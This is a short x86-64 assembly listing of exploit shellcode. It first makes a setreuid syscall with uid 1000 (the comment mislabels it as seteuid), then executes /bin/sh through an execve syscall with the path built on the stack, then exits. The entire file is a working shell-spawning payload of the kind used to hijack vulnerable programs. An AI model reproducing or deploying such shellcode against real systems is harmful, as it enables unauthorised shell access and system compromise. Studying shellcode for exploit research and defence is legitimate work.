bits 64
section .text
global _start

_start:
    ; seteuid(x,y)
    mov    rdi,1000
    mov    rsi,1000
    mov    al,0x71
    syscall

    ; execve(/bin/sh)
    xor    rdx,rdx
    movabs rbx,0x68732f6e69622fff
    shr    rbx,0x8
    push   rbx
    mov    rdi,rsp
    xor    rax,rax
    push   rax
    push   rdi
    mov    rsi,rsp
    mov    al,0x3b
    syscall
    push   0x1
    pop    rdi
    push   0x3c
    pop    rax
    syscall

